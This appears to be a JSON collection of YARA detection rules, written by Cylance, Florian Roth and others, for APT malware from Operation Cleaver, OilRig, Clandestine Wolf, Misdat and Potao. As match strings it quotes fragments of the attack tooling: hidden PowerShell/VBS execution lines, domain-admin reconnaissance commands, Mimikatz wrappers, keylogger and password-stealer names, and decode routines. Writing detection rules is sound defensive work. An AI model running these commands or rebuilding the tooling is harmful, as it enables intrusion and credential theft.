  "pvz_out": "rule pvz_out\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"Network Connectivity Module\" wide\n    $s2 = \"OSPPSVC\" wide\n\n  condition:\n    all of them\n}",
  "wndTest": "rule wndTest\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"[Alt]\" wide\n    $s2 = \"<< %s >>:\" wide\n    $s3 = \"Content-Disposition: inline; comp=%s; account=%s; product=%d;\"\n\n  condition:\n    all of them\n}",
  "zhCat": "rule zhCat\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"zhCat -l -h -tp 1234\"\n    $s2 = \"ABC ( A Big Company )\" wide\n\n  condition:\n    all of them\n}",
  "zhLookUp": "rule zhLookUp\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"zhLookUp.Properties\"\n\n  condition:\n    all of them\n}",
  "zhmimikatz": "rule zhmimikatz\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"MimikatzRunner\"\n    $s2 = \"zhmimikatz\"\n\n  condition:\n    all of them\n}",
  "Zh0uSh311": "rule Zh0uSh311\n{\n\n  meta:\n    author = \"Cylance\"\n    date = \"2014-12-02\"\n    description = \"http://cylance.com/opcleaver\"\n\n  strings:\n    $s1 = \"Zh0uSh311\"\n\n  condition:\n    all of them\n}",
  "OPCLEAVER_BackDoorLogger": "rule OPCLEAVER_BackDoorLogger\n{\n\n    meta:\n        description = \"Keylogger used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"BackDoorLogger\"\n        $s2 = \"zhuAddress\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_Jasus": "rule OPCLEAVER_Jasus\n{\n\n    meta:\n        description = \"ARP cache poisoner used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"pcap_dump_open\"\n        $s2 = \"Resolving IPs to poison...\"\n        $s3 = \"WARNNING: Gateway IP can not be found\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_LoggerModule": "rule OPCLEAVER_LoggerModule\n{\n\n    meta:\n        description = \"Keylogger used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"%s-%02d%02d%02d%02d%02d.r\"\n        $s2 = \"C:\\\\Users\\\\%s\\\\AppData\\\\Cookies\\\\\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_NetC": "rule OPCLEAVER_NetC\n{\n\n    meta:\n        description = \"Net Crawler used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"NetC.exe\" wide\n        $s2 = \"Net Service\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_ShellCreator2": "rule OPCLEAVER_ShellCreator2\n{\n\n    meta:\n        description = \"Shell Creator used by attackers in Operation Cleaver to create ASPX web shells\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"ShellCreator2.Properties\"\n        $s2 = \"set_IV\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_SmartCopy2": "rule OPCLEAVER_SmartCopy2\n{\n\n    meta:\n        description = \"Malware or hack tool used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"SmartCopy2.Properties\"\n        $s2 = \"ZhuFrameWork\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_SynFlooder": "rule OPCLEAVER_SynFlooder\n{\n\n    meta:\n        description = \"Malware or hack tool used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"Unable to resolve [ %s ]. ErrorCode %d\"\n        $s2 = \"your target\u2019s IP is : %s\"\n        $s3 = \"Raw TCP Socket Created successfully.\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_TinyZBot": "rule OPCLEAVER_TinyZBot\n{\n\n    meta:\n        description = \"Tiny Bot used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"NetScp\" wide\n        $s2 = \"TinyZBot.Properties.Resources.resources\"\n        $s3 = \"Aoao WaterMark\"\n        $s4 = \"Run_a_exe\"\n        $s5 = \"netscp.exe\"\n        $s6 = \"get_MainModule_WebReference_DefaultWS\"\n        $s7 = \"remove_CheckFileMD5Completed\"\n        $s8 = \"http://tempuri.org/\"\n        $s9 = \"Zhoupin_Cleaver\"\n\n    condition:\n        (($s1 and $s2) or ($s3 and $s4 and $s5) or ($s6 and $s7 and $s8) or $s9)\n}",
  "OPCLEAVER_ZhoupinExploitCrew": "rule OPCLEAVER_ZhoupinExploitCrew\n{\n\n    meta:\n        description = \"Keywords used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"zhoupin exploit crew\" nocase\n        $s2 = \"zhopin exploit crew\" nocase\n\n    condition:\n        1 of them\n}",
  "OPCLEAVER_antivirusdetector": "rule OPCLEAVER_antivirusdetector\n{\n\n    meta:\n        description = \"Hack tool used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"getShadyProcess\"\n        $s2 = \"getSystemAntiviruses\"\n        $s3 = \"AntiVirusDetector\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_csext": "rule OPCLEAVER_csext\n{\n\n    meta:\n        description = \"Backdoor used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"COM+ System Extentions\"\n        $s2 = \"csext.exe\"\n        $s3 = \"COM_Extentions_bin\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_kagent": "rule OPCLEAVER_kagent\n{\n\n    meta:\n        description = \"Backdoor used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"kill command is in last machine, going back\"\n        $s2 = \"message data length in B64: %d Bytes\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_mimikatzWrapper": "rule OPCLEAVER_mimikatzWrapper\n{\n\n    meta:\n        description = \"Mimikatz Wrapper used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"mimikatzWrapper\"\n        $s2 = \"get_mimikatz\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_pvz_in": "rule OPCLEAVER_pvz_in\n{\n\n    meta:\n        description = \"Parviz tool used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"LAST_TIME=00/00/0000:00:00PM$\"\n        $s2 = \"if %%ERRORLEVEL%% == 1 GOTO line\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_pvz_out": "rule OPCLEAVER_pvz_out\n{\n\n    meta:\n        description = \"Parviz tool used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"Network Connectivity Module\" wide\n        $s2 = \"OSPPSVC\" wide\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_wndTest": "rule OPCLEAVER_wndTest\n{\n\n    meta:\n        description = \"Backdoor used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"[Alt]\" wide\n        $s2 = \"<< %s >>:\" wide\n        $s3 = \"Content-Disposition: inline; comp=%s; account=%s; product=%d;\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_zhCat": "rule OPCLEAVER_zhCat\n{\n\n    meta:\n        description = \"Network tool used by Iranian hackers and used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"Mozilla/4.0 ( compatible; MSIE 7.0; AOL 8.0 )\" ascii fullword\n        $s2 = \"ABC ( A Big Company )\" wide fullword\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_zhLookUp": "rule OPCLEAVER_zhLookUp\n{\n\n    meta:\n        description = \"Hack tool used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"zhLookUp.Properties\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_zhmimikatz": "rule OPCLEAVER_zhmimikatz\n{\n\n    meta:\n        description = \"Mimikatz wrapper used by attackers in Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Cylance Inc.\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"MimikatzRunner\"\n        $s2 = \"zhmimikatz\"\n\n    condition:\n        all of them\n}",
  "OPCLEAVER_Parviz_Developer": "rule OPCLEAVER_Parviz_Developer\n{\n\n    meta:\n        description = \"Parviz developer known from Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Florian Roth\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"Users\\\\parviz\\\\documents\\\\\" nocase\n\n    condition:\n        $s1\n}",
  "OPCLEAVER_CCProxy_Config": "rule OPCLEAVER_CCProxy_Config\n{\n\n    meta:\n        description = \"CCProxy config known from Operation Cleaver\"\n        reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n        date = \"2014/12/02\"\n        author = \"Florian Roth\"\n        score = \"70\"\n\n    strings:\n        $s1 = \"UserName=User-001\" fullword ascii\n        $s2 = \"Web=1\" fullword ascii\n        $s3 = \"Mail=1\" fullword ascii\n        $s4 = \"FTP=0\" fullword ascii\n        $x1 = \"IPAddressLow=78.109.194.114\" fullword ascii\n\n    condition:\n        all of ($s*) or $x1\n}",
  "OilRig_Malware_Campaign_Gen1": "rule OilRig_Malware_Campaign_Gen1 \n{\n\n   meta:\n      description = \"Detects malware from OilRig Campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12\"\n      hash1 = \"d808f3109822c185f1d8e1bf7ef7781c219dc56f5906478651748f0ace489d34\"\n      hash2 = \"80161dad1603b9a7c4a92a07b5c8bce214cf7a3df897b561732f9df7920ecb3e\"\n      hash3 = \"662c53e69b66d62a4822e666031fd441bbdfa741e20d4511c6741ec3cb02475f\"\n      hash4 = \"903b6d948c16dc92b69fe1de76cf64ab8377893770bf47c29bf91f3fd987f996\"\n      hash5 = \"c4fbc723981fc94884f0f493cb8711fdc9da698980081d9b7c139fcffbe723da\"\n      hash6 = \"57efb7596e6d9fd019b4dc4587ba33a40ab0ca09e14281d85716a253c5612ef4\"\n      hash7 = \"1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1\"\n      hash8 = \"9f31a1908afb23a1029c079ee9ba8bdf0f4c815addbe8eac85b4163e02b5e777\"\n      hash9 = \"0cd9857a3f626f8e0c07495a4799c59d502c4f3970642a76882e3ed68b790f8e\"\n      hash10 = \"4b5112f0fb64825b879b01d686e8f4d43521252a3b4f4026c9d1d76d3f15b281\"\n      hash11 = \"4e5b85ea68bf8f2306b6b931810ae38c8dff3679d78da1af2c91032c36380353\"\n      hash12 = \"c3c17383f43184a29f49f166a92453a34be18e51935ddbf09576a60441440e51\"\n      hash13 = \"f3856c7af3c9f84101f41a82e36fc81dfc18a8e9b424a3658b6ba7e3c99f54f2\"\n      hash14 = \"0c64ab9b0c122b1903e8063e3c2c357cbbee99de07dc535e6c830a0472a71f39\"\n      hash15 = \"d874f513a032ccb6a5e4f0cd55862b024ea0bee4de94ccf950b3dd894066065d\"\n      hash16 = \"8ee628d46b8af20c4ba70a2fe8e2d4edca1980583171b71fe72455c6a52d15a9\"\n      hash17 = \"55d0e12439b20dadb5868766a5200cbbe1a06053bf9e229cf6a852bfcf57d579\"\n      hash18 = \"528d432952ef879496542bc62a5a4b6eee788f60f220426bd7f933fa2c58dc6b\"\n      hash19 = \"93940b5e764f2f4a2d893bebef4bf1f7d63c4db856877020a5852a6647cb04a0\"\n      hash20 = \"e2ec7fa60e654f5861e09bbe59d14d0973bd5727b83a2a03f1cecf1466dd87aa\"\n      hash21 = \"9c0a33a5dc62933f17506f20e0258f877947bdcd15b091a597eac05d299b7471\"\n      hash22 = \"a787c0e42608f9a69f718f6dca5556607be45ec77d17b07eb9ea1e0f7bb2e064\"\n      hash23 = \"3772d473a2fe950959e1fd56c9a44ec48928f92522246f75f4b8cb134f4713ff\"\n      hash24 = \"3986d54b00647b507b2afd708b7a1ce4c37027fb77d67c6bc3c20c3ac1a88ca4\"\n      hash25 = \"f5a64de9087b138608ccf036b067d91a47302259269fb05b3349964ca4060e7e\"\n\n   strings:\n      $x1 = \"Get-Content $env:Public\\\\Libraries\\\\update.vbs) -replace\" ascii\n      $x2 = \"wss.Run \\\"powershell.exe \\\" & Chr(34) & \\\"& {waitfor haha /T 2}\\\" & Chr(34), 0\" fullword ascii\n      $x3 = \"Call Extract(UpdateVbs, wss.ExpandEnvironmentStrings(\\\"%PUBLIC%\\\") & \\\"\\\\Libraries\\\\update.vbs\\\")\" fullword ascii\n      $s4 = \"CreateObject(\\\"WScript.Shell\\\").Run cmd, 0o\" fullword ascii\n      /* Base64 encode config */\n      /* $global:myhost = */\n      $b1 = \"JGdsb2JhbDpteWhvc3QgP\" ascii\n      /* HOME=\"%public%\\Libraries\\\" */\n      $b2 = \"SE9NRT0iJXB1YmxpYyVcTGlicmFyaWVzX\" ascii\n      /* Set wss = CreateObject(\"wScript.Shell\") */\n      $b3 = \"U2V0IHdzcyA9IENyZWF0ZU9iamVjdCgid1NjcmlwdC5TaGV\" ascii\n      /* $scriptdir = Split-Path -Parent -Path $ */\n      $b4 = \"JHNjcmlwdGRpciA9IFNwbGl0LVBhdGggLVBhcmVudCAtUGF0aCA\" ascii\n      /* \\x0aSet wss = CreateObject(\"wScript.Shell\") */\n      $b5 = \"DQpTZXQgd3NzID0gQ3JlYXRlT2JqZWN\" ascii\n      /* whoami & hostname */\n      $b6 = \"d2hvYW1pICYgaG9zdG5hb\" ascii\n \n   condition:\n      ( uint16(0) == 0xcfd0 and filesize < 700KB and 1 of them )\n}",
  "OilRig_Malware_Campaign_Mal1": "",
  "OilRig_Malware_Campaign_Gen2": "",
  "OilRig_Malware_Campaign_Gen3": "rule OilRig_Malware_Campaign_Gen3 \n{\n\n   meta:\n      description = \"Detects malware from OilRig Campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12\"\n      hash1 = \"5e9ddb25bde3719c392d08c13a295db418d7accd25d82d020b425052e7ba6dc9\"\n      hash2 = \"bd0920c8836541f58e0778b4b64527e5a5f2084405f73ee33110f7bc189da7a9\"\n      hash3 = \"90639c7423a329e304087428a01662cc06e2e9153299e37b1b1c90f6d0a195ed\"\n\n   strings:\n      $x1 = \"source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlrrrr\" fullword ascii\n      $x2 = \"\\\\Libraries\\\\fireueye.vbs\" fullword ascii\n      $x3 = \"\\\\Libraries\\\\fireeye.vbs&\" fullword wide\n\n   condition:\n      ( uint16(0) == 0xcfd0 and filesize < 100KB and 1 of them )\n}",
  "OilRig_Malware_Campaign_Mal2": "",
  "OilRig_Campaign_Reconnaissance": "rule OilRig_Campaign_Reconnaissance \n{\n\n   meta:\n      description = \"Detects Windows discovery commands - known from OilRig Campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12\"\n      hash1 = \"5893eae26df8e15c1e0fa763bf88a1ae79484cdb488ba2fc382700ff2cfab80c\"\n\n   strings:\n      $s1 = \"whoami & hostname & ipconfig /all\" ascii\n      $s2 = \"net user /domain 2>&1 & net group /domain 2>&1\" ascii\n      $s3 = \"net group \\\"domain admins\\\" /domain 2>&1 & \" ascii\n\n   condition:\n      ( filesize < 1KB and 1 of them )\n}",
  "OilRig_Malware_Campaign_Mal3": "rule OilRig_Malware_Campaign_Mal3 \n{\n\n   meta:\n      description = \"Detects malware from OilRig Campaign\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QMRZ8K\"\n      date = \"2016-10-12\"\n      hash1 = \"02226181f27dbf59af5377e39cf583db15200100eea712fcb6f55c0a2245a378\"\n\n   strings:\n      $x1 = \"(Get-Content $env:Public\\\\Libraries\\\\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\\\\Libraries\\\\dns.ps1\" fullword ascii\n      $x2 = \"Invoke-Expression ($global:myhome+'tp\\\\'+$global:filename+'.bat > '+$global:myhome+'tp\\\\'+$global:filename+'.txt')\" fullword ascii\n      $x3 = \"('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))\" fullword ascii\n\n   condition:\n      ( filesize < 10KB and 1 of them )\n}",
  "OpClandestineWolf": "rule OpClandestineWolf \n{\n \n   meta:\n        alert_severity = \"HIGH\"\n        log = \"false\"\n        author = \"NDF\"\n        weight = 10\n        alert = true\n        source = \" https://www.fireeye.com/blog/threat-research/2015/06/operation-clandestine-wolf-adobe-flash-zero-day.html\"\n        version = 1\n        date = \"2015-06-23\"\n        description = \"Operation Clandestine Wolf signature based on OSINT from 06.23.15\"\n        hash0 = \"1a4b710621ef2e69b1f7790ae9b7a288\"\n        hash1 = \"917c92e8662faf96fffb8ffe7b7c80fb\"\n        hash2 = \"975b458cb80395fa32c9dda759cb3f7b\"\n        hash3 = \"3ed34de8609cd274e49bbd795f21acc4\"\n        hash4 = \"b1a55ec420dd6d24ff9e762c7b753868\"\n        hash5 = \"afd753a42036000ad476dcd81b56b754\"\n        hash6 = \"fad20abf8aa4eda0802504d806280dd7\"\n        hash7 = \"ab621059de2d1c92c3e7514e4b51751a\"\n        hash8 = \"510b77a4b075f09202209f989582dbea\"\n        hash9 = \"d1b1abfcc2d547e1ea1a4bb82294b9a3\"\n        hash10 = \"4692337bf7584f6bda464b9a76d268c1\"\n        hash11 = \"7cae5757f3ba9fef0a22ca0d56188439\"\n        hash12 = \"1a7ba923c6aa39cc9cb289a17599fce0\"\n        hash13 = \"f86db1905b3f4447eb5728859f9057b5\"\n        hash14 = \"37c6d1d3054e554e13d40ea42458ebed\"\n        hash15 = \"3e7430a09a44c0d1000f76c3adc6f4fa\"\n        hash16 = \"98eb249e4ddc4897b8be6fe838051af7\"\n        hash17 = \"1b57a7fad852b1d686c72e96f7837b44\"\n        hash18 = \"ffb84b8561e49a8db60e0001f630831f\"\n        hash19 = \"98eb249e4ddc4897b8be6fe838051af7\"\n        hash20 = \"dfb4025352a80c2d81b84b37ef00bcd0\"\n        hash21 = \"4457e89f4aec692d8507378694e0a3ba\"\n        hash22 = \"48de562acb62b469480b8e29821f33b8\"\n        hash23 = \"7a7eed9f2d1807f55a9308e21d81cccd\"\n        hash24 = \"6817b29e9832d8fd85dcbe4af176efb6\"\n\n   strings:\n        $s0 = \"flash.Media.Sound()\"\n        $s1 = \"call Kernel32!VirtualAlloc(0x1f140000hash$=0x10000hash$=0x1000hash$=0x40)\"\n        $s2 = \"{4D36E972-E325-11CE-BFC1-08002BE10318}\"\n        $s3 = \"NetStream\"\n\n    condition:\n        all of them\n}",
  "Misdat_Backdoor_Packed": "rule Misdat_Backdoor_Packed\n{\n    \n    meta:\n        author = \"Cylance SPEAR Team\"\n        note = \"Probably Prone to False Positive\"\n\n    strings:\n        $upx = {33 2E 30 33 00 55 50 58 21}\n        $send = {00 00 00 73 65 6E 64 00 00 00}\n        $delphi_sec_pe = {50 45 00 00 4C 01 03 00 19 5E 42 2A}\n        $shellexec = {00 00 00 53 68 65 6C 6C 45 78 65 63 75 74 65 57 00 00 00}\n        \n    condition:\n        filesize < 100KB and $upx and $send and $delphi_sec_pe and $shellexec\n}",
  "MiSType_Backdoor_Packed": "rule MiSType_Backdoor_Packed\n{\n    \n    meta:\n        author = \"Cylance SPEAR Team\"\n        note = \"Probably Prone to False Positive\"\n\n    strings:\n        $upx = {33 2E 30 33 00 55 50 58 21}\n        $send_httpquery = {00 00 00 48 74 74 70 51 75 65 72 79 49 6E 66 6F 41 00 00 73 65 6E 64 00 00}\n        $delphi_sec_pe = {50 45 00 00 4C 01 03 00 19 5E 42 2A}\n    \n    condition:\n        filesize < 100KB and $upx and $send_httpquery and $delphi_sec_pe\n}",
  "Misdat_Backdoor": "rule Misdat_Backdoor\n{\n   \n   meta:\n        author = \"Cylance SPEAR Team\"\n        /* Decode Function\n        CODE:00406C71 8B 55 F4                  mov     edx, [ebp+var_C]\n        CODE:00406C74 8A 54 1A FF               mov     dl, [edx+ebx-1]\n        CODE:00406C78 8B 4D F8                  mov     ecx, [ebp+var_8]\n        CODE:00406C7B C1 E9 08                  shr     ecx, 8\n        CODE:00406C7E 32 D1                     xor     dl, cl\n        CODE:00406C80 88 54 18 FF               mov     [eax+ebx-1], dl\n        CODE:00406C84 8B 45 F4                  mov     eax, [ebp+var_C]\n        CODE:00406C87 0F B6 44 18 FF            movzx   eax, byte ptr [eax+ebx-1]\n        CODE:00406C8C 03 45 F8                  add     eax, [ebp+var_8]\n        CODE:00406C8F 69 C0 D9 DB 00 00         imul    eax, 0DBD9h\n        CODE:00406C95 05 3B DA 00 00            add     eax, 0DA3Bh\n        CODE:00406C9A 89 45 F8                  mov     [ebp+var_8], eax\n        CODE:00406C9D 43                        inc     ebx\n        CODE:00406C9E 4E                        dec     esi\n        CODE:00406C9F 75 C9                     jnz     short loc_406C6A\n        */\n    \n    strings:\n        $imul = {03 45 F8 69 C0 D9 DB 00 00 05 3B DA 00 00}\n        $delphi = {50 45 00 00 4C 01 08 00 19 5E 42 2A}\n        \n    condition:\n        $imul and $delphi\n}",
  "SType_Backdoor": "rule SType_Backdoor\n{\n   \n    meta:\n        author = \"Cylance SPEAR Team\"\n        \n        /* Decode Function\n        8B 1A       mov     ebx, [edx]\n        8A 1B       mov     bl, [ebx]\n        80 EB 02    sub     bl, 2\n        8B 74 24 08 mov     esi, [esp+14h+var_C]\n        32 1E       xor     bl, [esi]\n        8B 31       mov     esi, [ecx]\n        88 1E       mov     [esi], bl\n        8B 1A       mov     ebx, [edx]\n        43          inc     ebx\n        89 1A       mov     [edx], ebx\n        8B 19       mov     ebx, [ecx]\n        43          inc     ebx\n        89 19       mov     [ecx], ebx\n        48          dec     eax\n        75 E2       jnz     short loc_40EAC6\n        */\n\n    strings:\n        $stype = \"stype=info&data=\"\n        $mmid = \"?mmid=\"\n        $status = \"&status=run succeed\"\n        $mutex = \"_KB10B2D1_CIlFD2C\"\n        $decode = {8B 1A 8A 1B 80 EB 02 8B 74 24 08 32 1E 8B 31 88 1E 8B 1A 43}\n    \n    condition:\n        $stype or ($mmid and $status) or $mutex or $decode\n}",
  "Zlib_Backdoor": "rule Zlib_Backdoor\n{\n   \n    meta:\n        author = \"Cylance SPEAR Team\"\n        \n        /* String\n        C7 45 FC 00 04 00 00          mov     [ebp+Memory], 400h\n        C6 45 D8 50                   mov     [ebp+Str], 'P'\n        C6 45 D9 72                   mov     [ebp+var_27], 'r'\n        C6 45 DA 6F                   mov     [ebp+var_26], 'o'\n        C6 45 DB 78                   mov     [ebp+var_25], 'x'\n        C6 45 DC 79                   mov     [ebp+var_24], 'y'\n        C6 45 DD 2D                   mov     [ebp+var_23], '-'\n        C6 45 DE 41                   mov     [ebp+var_22], 'A'\n        C6 45 DF 75                   mov     [ebp+var_21], 'u'\n        C6 45 E0 74                   mov     [ebp+var_20], 't'\n        C6 45 E1 68                   mov     [ebp+var_1F], 'h'\n        C6 45 E2 65                   mov     [ebp+var_1E], 'e'\n        C6 45 E3 6E                   mov     [ebp+var_1D], 'n'\n        C6 45 E4 74                   mov     [ebp+var_1C], 't'\n        C6 45 E5 69                   mov     [ebp+var_1B], 'i'\n        C6 45 E6 63                   mov     [ebp+var_1A], 'c'\n        C6 45 E7 61                   mov     [ebp+var_19], 'a'\n        C6 45 E8 74                   mov     [ebp+var_18], 't'\n        C6 45 E9 65                   mov     [ebp+var_17], 'e'\n        C6 45 EA 3A                   mov     [ebp+var_16], ':'\n        C6 45 EB 20                   mov     [ebp+var_15], ' '\n        C6 45 EC 4E                   mov     [ebp+var_14], 'N'\n        C6 45 ED 54                   mov     [ebp+var_13], 'T'\n        C6 45 EE 4C                   mov     [ebp+var_12], 'L'\n        C6 45 EF 4D                   mov     [ebp+var_11], 'M'\n        C6 45 F0 20                   mov     [ebp+var_10], ' '\n        */\n\n\n    strings:\n        $auth = {C6 45 D8 50 C6 45 D9 72 C6 45 DA 6F C6 45 DB 78 C6 45 DC 79 C6 45 DD 2D}\n        $auth2 = {C7 45 FC 00 04 00 00 C6 45 ?? 50 C6 45 ?? 72 C6 45 ?? 6F}\n        $ntlm = \"NTLM\" wide\n    \n    condition:\n        ($auth or $auth2) and $ntlm\n}",
  "PotaoDecoy": "rule PotaoDecoy\n{\n    \n    strings:\n        $mz = { 4d 5a }\n        $str1 = \"eroqw11\"\n        $str2 = \"2sfsdf\"\n        $str3 = \"RtlDecompressBuffer\"\n        $wiki_str = \"spanned more than 100 years and ruined three consecutive\" wide\n        $old_ver1 = {53 68 65 6C 6C 33 32 2E 64 6C 6C 00 64 61 66 73 72 00 00 00 64 61 66 73 72 00 00 00 64 6F 63 (00 | 78)}\n        $old_ver2 = {6F 70 65 6E 00 00 00 00 64 6F 63 00 64 61 66 73 72 00 00 00 53 68 65 6C 6C 33 32 2E 64 6C 6C 00}       \n    \n    condition:\n        ($mz at 0) and ( (all of ($str*)) or any of ($old_ver*) or $wiki_str )\n}",
  "PotaoDll": "rule PotaoDll\n{\n\n    strings:\n        $mz = { 4d 5a }      \n        $dllstr1 = \"?AVCncBuffer@@\"\n        $dllstr2 = \"?AVCncRequest@@\"\n        $dllstr3 = \"Petrozavodskaya, 11, 9\"\n        $dllstr4 = \"_Scan@0\"\n        $dllstr5 = \"\\x00/sync/document/\"\n        $dllstr6 = \"\\\\temp.temp\"\n        $dllname1 = \"node69MainModule.dll\"\n        $dllname2 = \"node69-main.dll\"\n        $dllname3 = \"node69MainModuleD.dll\"\n        $dllname4 = \"task-diskscanner.dll\"\n        $dllname5 = \"\\x00Screen.dll\"\n        $dllname6 = \"Poker2.dll\"        \n        $dllname7 = \"PasswordStealer.dll\"\n        $dllname8 = \"KeyLog2Runner.dll\" \n        $dllname9 = \"GetAllSystemInfo.dll\"          \n        $dllname10 = \"FilePathStealer.dll\"          \n   \n    condition:\n        ($mz at 0) and (any of ($dllstr*) and any of ($dllname*))\n}",
